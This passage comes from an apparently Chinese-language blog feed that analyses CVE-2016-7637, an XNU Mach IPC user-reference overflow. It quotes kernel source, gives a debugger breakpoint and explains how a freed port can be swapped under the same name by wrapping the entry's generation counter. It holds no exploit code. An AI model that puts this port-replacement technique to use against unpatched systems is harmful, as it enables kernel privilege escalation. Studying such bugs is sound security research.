<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// osfmk/ipc/ipc_space.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">natural_t</span> <span class="keyword">ipc_space_refs_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ipc_space &#123;</span><br><span class="line">    decl_mutex_data(,is_ref_lock_data)</span><br><span class="line">    <span class="keyword">ipc_space_refs_t</span> is_references;</span><br><span class="line"></span><br><span class="line">    decl_mutex_data(,is_lock_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// is the space active?</span></span><br><span class="line">    <span class="keyword">boolean_t</span> is_active;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// is the space growing?</span></span><br><span class="line">    <span class="keyword">boolean_t</span> is_growing;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// table (array) of IPC entries</span></span><br><span class="line">    <span class="comment">// è¿™ä¸ªæ˜¯æœ€é‡è¦çš„ï¼Œå­˜æ”¾äº†æ‰€æœ‰çš„entry</span></span><br><span class="line">    <span class="keyword">ipc_entry_t</span> is_table; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// current table size</span></span><br><span class="line">    <span class="keyword">ipc_entry_num_t</span> is_table_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// information for larger table</span></span><br><span class="line">    <span class="keyword">struct</span> ipc_table_size *is_table_next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// splay tree of IPC entries (can be NULL)</span></span><br><span class="line">    <span class="keyword">struct</span> ipc_splay_tree is_tree;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number of entries in the tree</span></span><br><span class="line">    <span class="keyword">ipc_entry_num_t</span> is_tree_total;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number of "small" entries in the tree</span></span><br><span class="line">    <span class="keyword">ipc_entry_num_t</span> is_tree_small;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number of hashed entries in the tree</span></span><br><span class="line">    <span class="keyword">ipc_entry_num_t</span> is_tree_hash;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for is_fast_space()</span></span><br><span class="line">    <span class="keyword">boolean_t</span> is_fast;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>è€Œæˆ‘ä»¬ç ”ç©¶çš„å¯¹è±¡ <code>Mach Ports</code>å…¨éƒ½å­˜å‚¨åœ¨<code>is_table</code>è¿™ä¸ªæ•°ç»„ä¸­ï¼Œè¿™ä¸ªæ•°ç»„å°±æ˜¯ç”±<code>ipc_entry</code>ç»„æˆçš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ipc_entry &#123;</span><br><span class="line">	<span class="keyword">struct</span> ipc_object *ie_object; 	<span class="comment">//ipc_port_t</span></span><br><span class="line">	<span class="keyword">ipc_entry_bits_t</span> ie_bits;		<span class="comment">//gen|0|0|0|capability|user reference</span></span><br><span class="line">	<span class="keyword">mach_port_index_t</span> ie_index;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">mach_port_index_t</span> next;		<span class="comment">/* next in freelist, or...  */</span></span><br><span class="line">		<span class="keyword">ipc_table_index_t</span> request;	<span class="comment">/* dead name request notify */</span></span><br><span class="line">	&#125; index;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ç”¨ä¸€å¼ ä¹¦ä¸Šçš„å›¾ï¼Œå¾ˆæ¸…æ¥šçš„è¡¨æ˜äº†ä»–ä»¬ä¹‹é—´çš„å…³ç³»ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/space%E5%92%8Centry.png" alt=""></p>
<h3 id="1-3-2_ipc_port">1.3.2 ipc_port</h3><p>ç›¸å¯¹è€Œè¨€ipc_portçš„æ•°æ®ç»“æ„å°±è¾ƒä¸ºç®€å•äº†ã€‚åœ¨å¤åˆ¶ç»™<code>space</code>çš„<code>ie_object</code>ä¹‹åï¼Œé€šè¿‡<code>ipc_port_init</code>å‡½æ•°çš„åˆå§‹åŒ–ï¼Œå°±å®Œæˆäº†<code>port</code>çš„åˆ›å»ºäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ipc_port_init(</span><br><span class="line">	<span class="keyword">ipc_port_t</span>		port,</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	name)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* port-&gt;ip_kobject doesn't have to be initialized */</span></span><br><span class="line"></span><br><span class="line">	port-&gt;ip_receiver = space;</span><br><span class="line">	port-&gt;ip_receiver_name = name;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_mscount = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_srights = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_sorights = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_nsrequest = IP_NULL;</span><br><span class="line">	port-&gt;ip_pdrequest = IP_NULL;</span><br><span class="line">	port-&gt;ip_requests = IPR_NULL;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_premsg = IKM_NULL;</span><br><span class="line">	port-&gt;ip_context = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_sprequests  = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_spimportant = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_impdonation = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_tempowner   = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_guarded      = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_strict_guard = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_impcount    = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_reserved    = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ipc_mqueue_init(&amp;port-&gt;ip_messages,</span><br><span class="line">			FALSE <span class="comment">/* !set */</span>, <span class="literal">NULL</span> <span class="comment">/* no reserved link */</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡ŒåŒæ ·çš„ç”¨ä¹¦ä¸Šçš„ä¸€å¼ å›¾å°±å¯ä»¥å¾ˆç®€å•çš„è§£é‡Šæ¸…æ¥šäº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/ipc_port.png" alt="ipc_port"></p>
<h1 id="0x02_POCçš„åˆ†æ">0x02 POCçš„åˆ†æ</h1><p>â€‹    POCåŸæ¥çš„writeupåœ¨<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=959&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚</p>
<p>â€‹    åŸæ–‡å·²ç»è§£é‡Šçš„éå¸¸æ¸…æ¥šäº†ï¼Œæˆ‘å°±ä¸ç”»è›‡æ·»è¶³äº†ã€‚ç®€å•è®°å½•ä¸€ä¸‹æˆ‘è‡ªå·±åœ¨åˆ†æçš„è¿‡ç¨‹ä¸­çš„ä¸€äº›é—®é¢˜ã€‚</p>
<h2 id="2-1_portçš„user_referenceè®¡æ•°ä»£è¡¨äº†ä»€ä¹ˆï¼Ÿ">2.1 portçš„user referenceè®¡æ•°ä»£è¡¨äº†ä»€ä¹ˆï¼Ÿ</h2><p>â€‹    ä¸€ä¸ª<code>port</code>çš„<code>user reference</code>åªè¡¨ç¤ºäº†æŸä¸ª<code>entry</code>åœ¨<code>task</code>çš„<code>space</code>ä¸­è¢«å¤šå°‘ä¸ªåœ°æ–¹ä½¿ç”¨ï¼Œå’Œ<code>entry</code>å®é™…æŒ‡å‘å“ªä¸ª<code>port</code>æ²¡æœ‰å…³ç³»ã€‚</p>
<p>â€‹    </p>
<h2 id="2-2_ipc_right_deallocå‡½æ•°æ˜¯åªé‡Šæ”¾äº†entryè¿˜æ˜¯åŒæ—¶ä¹Ÿåœ¨å†…å­˜ä¸­é‡Šæ”¾äº†portï¼Ÿ">2.2 ipc_right_deallocå‡½æ•°æ˜¯åªé‡Šæ”¾äº†entryè¿˜æ˜¯åŒæ—¶ä¹Ÿåœ¨å†…å­˜ä¸­é‡Šæ”¾äº†portï¼Ÿ</h2><p>â€‹    <code>ipc_right_dealloc</code>å‡½æ•°ç›¸å…³éƒ¨åˆ†æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_right_dealloc(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	name,</span><br><span class="line">	<span class="keyword">ipc_entry_t</span>		entry)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">ipc_port_t</span> port = IP_NULL;</span><br><span class="line">	<span class="keyword">ipc_entry_bits_t</span> bits;</span><br><span class="line">	<span class="keyword">mach_port_type_t</span> type;</span><br><span class="line"></span><br><span class="line">	bits = entry-&gt;ie_bits;</span><br><span class="line">	type = IE_BITS_TYPE(bits);</span><br><span class="line"></span><br><span class="line">	assert(is_active(space));</span><br><span class="line">	<span class="keyword">switch</span> (type) &#123;</span><br><span class="line">         [...]</span><br><span class="line">	    <span class="keyword">case</span> MACH_PORT_TYPE_SEND: &#123;</span><br><span class="line">		[...]</span><br><span class="line">		port = (<span class="keyword">ipc_port_t</span>) entry-&gt;ie_object;</span><br><span class="line">		[...]</span><br><span class="line">         <span class="comment">//å¦‚æœåœ¨taskå†…entryçš„referenceå·²ç»ä¸º1äº†å°±</span></span><br><span class="line">         <span class="comment">//é‡Šæ”¾entry</span></span><br><span class="line">         <span class="comment">//å¦‚æœè®¡æ•°ä¸ä¸º1ï¼Œå°±å°†è®¡æ•°å‡ä¸€</span></span><br><span class="line">		<span class="keyword">if</span> (IE_BITS_UREFS(bits) == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (--port-&gt;ip_srights == <span class="number">0</span>) &#123;</span><br><span class="line">				nsrequest = port-&gt;ip_nsrequest;</span><br><span class="line">				<span class="keyword">if</span> (nsrequest != IP_NULL) &#123;</span><br><span class="line">					port-&gt;ip_nsrequest = IP_NULL;</span><br><span class="line">					mscount = port-&gt;ip_mscount;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			[...]</span><br><span class="line">			entry-&gt;ie_object = IO_NULL;</span><br><span class="line">			ipc_entry_dealloc(space, name, entry);</span><br><span class="line">			is_write_unlock(space);</span><br><span class="line">			ip_release(port);</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ip_unlock(port);			</span><br><span class="line">			entry-&gt;ie_bits = bits-<span class="number">1</span>; <span class="comment">/* decrement urefs */</span></span><br><span class="line">			ipc_entry_modified(space, name, entry);</span><br><span class="line">			is_write_unlock(space);</span><br><span class="line">		&#125;</span><br><span class="line">	[...]</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥å½“<code>entry</code>è®¡æ•°ä¸º1çš„æ—¶å€™ï¼Œè°ƒç”¨äº†<code>ipc_entry_dealloc</code>ï¼Œ<code>ipc_entry_dealloc</code>ä¸ä¼šå°†<code>entry</code>å¯¹åº”çš„å†…å­˜é‡Šæ”¾ï¼Œè€Œæ˜¯å°†å…¶æ”¾å…¥ä¸€ä¸ª<code>free_list</code>ç­‰å¾…é‡å¤ä½¿ç”¨ã€‚<code>entry</code>çš„å†…å­˜ä¸ä¼šé‡Šæ”¾ï¼Œè€Œä¸”<code>entry</code>åœ¨<code>is_table</code>ä¸­çš„<code>index</code>ä¹Ÿå¹¶ä¸ä¼šæ”¹å˜ï¼Œåªæ˜¯è¢«æ”¾åˆ°äº†ä¸€ä¸ªç»“æ„ç®¡ç†çš„é˜Ÿåˆ—ä¸­å»äº†ã€‚</p>
<p>å¯¹äº<code>Port</code>æ¥è¯´ï¼Œå†…æ ¸è°ƒç”¨äº†<code>ip_release</code>ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å‡å°‘<code>ipc_object</code>è‡ªèº«çš„<code>reference</code>ï¼Œå¦‚æœ<code>port</code>çš„ç´¢å¼•å˜ä¸º0äº†ï¼Œé‚£å°±ä¼šè¢«é‡Šæ”¾ï¼Œå¦‚æœç³»ç»Ÿä¸­è¿˜æœ‰å…¶ä»–çš„è¿›ç¨‹åœ¨ä½¿ç”¨è¿™ä¸ª<code>port</code>ï¼Œé‚£ä¹ˆè¿™ä¸ª<code>port</code>å°±ä¸ä¼šè¢«é‡Šæ”¾ã€‚</p>
<h2 id="2-3_å¦‚ä½•é€šè¿‡è°ƒè¯•å™¨è°ƒè¯•æ¼æ´è§¦å‘çš„ç°åœº?">2.3 å¦‚ä½•é€šè¿‡è°ƒè¯•å™¨è°ƒè¯•æ¼æ´è§¦å‘çš„ç°åœº?</h2><p>ä¸€å¼€å§‹æˆ‘æƒ³çš„æ–¹æ³•æ˜¯å¯¹<code>ipc_right_copyout</code>ä¸‹æ¡ä»¶æ–­ç‚¹ï¼Œæ¡ä»¶æ˜¯<code>entry-&gt;ie_bits&amp;0xffff == 0xfffe</code>ã€‚ä½†æ˜¯å› ä¸º<code>ipc_right_copyout</code>è¿™ä¸ªå‡½æ•°åœ¨å†…æ ¸ä¸­çš„è°ƒç”¨å¤ªè¿‡äºé¢‘ç¹ï¼Œå¯¼è‡´è™šæ‹Ÿæœºè·‘å¤ªå¡äº†ã€‚</p>
<p>åªèƒ½é€šè¿‡é€†å‘ï¼Œåœ¨æ±‡ç¼–ä»£ç å¤„ä¸‹æ–­ç‚¹ã€‚ï¼ˆå†…æ ¸ç‰ˆæœ¬10.12_16A323ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/bug%E7%82%B9.png" alt=""></p>
<p>å¯¹åº”çš„å°±æ˜¯å‡ºbugçš„ä»£ç æ®µã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (urefs+<span class="number">1</span> == MACH_PORT_UREFS_MAX) &#123;</span><br><span class="line">     <span class="keyword">if</span> (overflow) &#123;</span><br><span class="line">         <span class="comment">/* leave urefs pegged to maximum */</span>     &lt;---- (<span class="number">1</span>)</span><br><span class="line">         </span><br><span class="line">         port-&gt;ip_srights--;</span><br><span class="line">         ip_unlock(port);</span><br><span class="line">         ip_release(port);</span><br><span class="line">         <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     ip_unlock(port);</span><br><span class="line">     <span class="keyword">return</span> KERN_UREFS_OVERFLOW;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥é€šè¿‡æ–­ç‚¹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *(0xffffff80002e6fbb + kslide)</span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥å¾—åˆ°æ¼æ´è§¦å‘æ—¶çš„æƒ…å†µã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/%E8%A7%A6%E5%8F%91.png" alt=""></p>
<h2 id="2-4_portæ›¿æ¢çš„åŸç†æ˜¯ä»€ä¹ˆ?">2.4  portæ›¿æ¢çš„åŸç†æ˜¯ä»€ä¹ˆ?</h2><p>portæ˜¯é€šè¿‡<code>port name</code>åœ¨taskä¸­æ¥è·å–çš„ã€‚åœ¨å‰æ–‡ä¸­æåˆ°ï¼Œ<code>namep</code>æ˜¯é€šè¿‡å‡½æ•°<code>ipc_entry_alloc</code>æ¥è·å–çš„ã€‚æŸ¥çœ‹è·å–åˆ°<code>namep</code>çš„æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_entry_claim(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep,</span><br><span class="line">	<span class="keyword">ipc_entry_t</span>		*entryp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">ipc_entry_t</span> entry;</span><br><span class="line">	<span class="keyword">ipc_entry_t</span> table;</span><br><span class="line">	<span class="keyword">mach_port_index_t</span> first_free;</span><br><span class="line">	<span class="keyword">mach_port_gen_t</span> gen;</span><br><span class="line">	<span class="keyword">mach_port_name_t</span> new_name;</span><br><span class="line"></span><br><span class="line">	table = &amp;space-&gt;is_table[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">	first_free = table-&gt;ie_next;</span><br><span class="line">	assert(first_free != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	entry = &amp;table[first_free];  <span class="comment">//[1]</span></span><br><span class="line">	table-&gt;ie_next = entry-&gt;ie_next;</span><br><span class="line">	space-&gt;is_table_free--;</span><br><span class="line"></span><br><span class="line">	assert(table-&gt;ie_next &lt; space-&gt;is_table_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 *	Initialize the new entry.  We need only</span><br><span class="line">	 *	increment the generation number and clear ie_request.</span><br><span class="line">	 */</span></span><br><span class="line">	gen = IE_BITS_NEW_GEN(entry-&gt;ie_bits); <span class="comment">//[2]</span></span><br><span class="line">	entry-&gt;ie_bits = gen;</span><br><span class="line">	entry-&gt;ie_request = IE_REQ_NONE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 *	The new name can't be MACH_PORT_NULL because index</span><br><span class="line">	 *	is non-zero.  It can't be MACH_PORT_DEAD because</span><br><span class="line">	 *	the table isn't allowed to grow big enough.</span><br><span class="line">	 *	(See comment in ipc/ipc_table.h.)</span><br><span class="line">	 */</span></span><br><span class="line">	new_name = MACH_PORT_MAKE(first_free, gen); <span class="comment">//[3]</span></span><br><span class="line">	assert(MACH_PORT_VALID(new_name));</span><br><span class="line">	*namep = new_name;</span><br><span class="line">	*entryp = entry;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡[1]å¯ä»¥çœ‹åˆ°ï¼Œæ­£å¦‚2.2èŠ‚æåˆ°çš„ä¸€æ ·ï¼Œ<code>entry</code>åœ¨<code>table</code>ä¸­çš„<code>index</code>æ˜¯ä¸å˜çš„ã€‚</p>
<p>é€šè¿‡[2]å¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡ä½¿ç”¨<code>entry</code>æ¥å­˜æ”¾ä¸€ä¸ªæ–°<code>port</code>æ—¶ï¼Œ<code>gen</code>çš„å€¼ä¼šåŠ 1ã€‚</p>
<p>é€šè¿‡[3]å¯ä»¥çœ‹åˆ°ï¼Œ<code>namep</code>å°±æ˜¯é€šè¿‡è¿™ä¸¤ä¸ªå‚æ•°ç”Ÿæˆçš„ã€‚</p>
<p>å› ä¸º<code>index</code>æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥åœ¨é€šè¿‡æ¼æ´é‡Šæ”¾target_portä¹‹åï¼Œä¸æ–­çš„å¯¹ç›®æ ‡<code>entry</code>è¿›è¡Œç”³è¯·å’Œé‡Šæ”¾ï¼Œå°±å¯ä»¥é€šè¿‡æ•´å½¢æº¢å‡ºï¼Œä½¿å¾—<code>gen</code>å˜æˆå’Œtaget_porté‡Šæ”¾ä¹‹å‰ä½¿ç”¨çš„entryç›¸åŒã€‚</p>
<p>é‚£ä¹ˆå°±å®ç°äº†åœ¨<code>port_name</code>ä¸å˜çš„æƒ…å†µä¸‹æ›¿æ¢äº†<code>port</code>çš„å†…æ ¸å¯¹è±¡ã€‚</p>
<h1 id="0x03_å°ç»“">0x03 å°ç»“</h1><p>é€šè¿‡CVE-2016-7637çš„åˆ†æå’Œç ”ç©¶åŠ æ·±äº†å¯¹<code>port</code>è¿™ä¸ªæ•°æ®ç»“æ„çš„ç†è§£ï¼Œå¹¶ä¸”é€šè¿‡å¯¹<code>poc</code>çš„åˆ†æï¼Œä½“ç°äº†ä¸€ä¸ª<code>port</code>åœ¨å•ä¸ª<code>task</code>ä¸­çš„çŠ¶æ€å˜åŒ–ï¼Œå®é™…ä¸Šæ˜¯<code>ipc_space</code>å’Œ<code>ipc_entry</code>çŠ¶æ€å˜åŒ–ã€‚</p>
<p>æ¥ä¸‹æ¥å°±è¦åˆ†æå­¦ä¹ CVE-2016-7644ï¼Œé€šè¿‡å¯¹CVE-2016-7644çš„åˆ†æå­¦ä¹ ï¼Œå¯ä»¥æ›´åŠ æ·±å…¥çš„ç†è§£portåœ¨å†…æ ¸ä¸­çŠ¶æ€çš„å˜åŒ–ã€‚ä¹Ÿå°±æ˜¯<code>port</code>è‡ªèº«çš„<code>port-&gt;srights</code>å’Œ<code>io_reference</code>çš„çŠ¶æ€å˜åŒ–åŠæ¼æ´çš„åˆ©ç”¨ã€‚</p>
<h1 id="å‚è€ƒ">å‚è€ƒ</h1><ol>
<li>ã€ŠMac OS X Internalsã€‹</li>
</ol>
<ol>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=959&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">Broken kernel mach port name uref</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>ä¸ºå­¦å¤§ç—…åœ¨å¥½åã€‚</p>
</blockquote>
<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    å»å¹´åœ¨åˆ†æ<a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">CVE-2016-1757</a>æ—¶ï¼Œåˆæ­¥çš„æ¥è§¦äº†<code>Mach</code>åœ¨<code>IPC</code>ç³»ç»Ÿä¸­ä½¿ç”¨çš„<code>Message</code>ï¼Œåœ¨åˆ†ææœ€è¿‘çš„ä¸€ç³»åˆ—ä¸<code>IPC</code>æ¨¡å—ç›¸å…³çš„æ¼æ´æ—¶ï¼ŒåˆåŠ å¼ºå¯¹<code>IPC</code>æ¨¡å—çš„ç†è§£ï¼Œæ‰€ä»¥é€šè¿‡ä¸€åˆ°ä¸¤ç¯‡æ–‡ç« æ¢³ç†ä¸€ä¸‹æœ€è¿‘çš„å­¦ä¹ æ€»ç»“ä¸å¿ƒå¾—ä½“ä¼šã€‚</p>
<p>â€‹    å…³äº<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7637">CVE-2016-7637</a>è¿™ä¸ªæ¼æ´çš„æè¿°æœ‰å¾ˆå¤šèµ„æ–™äº†ï¼Œæ˜¯ä¸€ä¸ªæ”»å‡»<code>Mach</code>çš„å†…æ ¸<code>IPC</code>æ¨¡å—çš„æ¼æ´ï¼Œæœ¬æ–‡æœ€åä¼šå¯¹æ¼æ´åšå‡ºæ¯”è¾ƒè¯¦ç»†çš„è§£é‡Šï¼Œè¿™é‡Œç»™å‡ºå‡ ä¸ªé“¾æ¥ï¼Œä¸ç†Ÿæ‚‰è¿™ä¸ªæ¼æ´çš„è¯»è€…å¯ä»¥å…ˆäº†è§£ä¸€ä¸‹ã€‚</p>
<p>â€‹    <a href="https://jaq.alibaba.com/community/art/show?articleid=687">é»‘äº‘å‹åŸåŸæ¬²æ‘§ - 2016å¹´iOSå…¬å¼€å¯åˆ©ç”¨æ¼æ´æ€»ç»“</a></p>
<p>â€‹    <a href="http://blog.pangu.io/mach-portal-details/">mach portalæ¼æ´åˆ©ç”¨çš„ä¸€äº›ç»†èŠ‚</a></p>
<p>â€‹    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=959&amp;can=1&amp;q=apple&amp;sort=-id">Broken kernel mach port name uref</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="IPC" scheme="http://turingh.github.io/tags/IPC/"/>
    
      <category term="MACH" scheme="http://turingh.github.io/tags/MACH/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4622è°ƒè¯•ç¬”è®°(PART II)]]></title>
    <link href="http://turingh.github.io/2016/12/07/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0PART2/"/>
    <id>http://turingh.github.io/2016/12/07/CVE-2016-4622è°ƒè¯•ç¬”è®°PART2/</id>
    <published>2016-12-07T21:09:48.000Z</published>
    <updated>2016-12-08T02:39:52.000Z</updated>
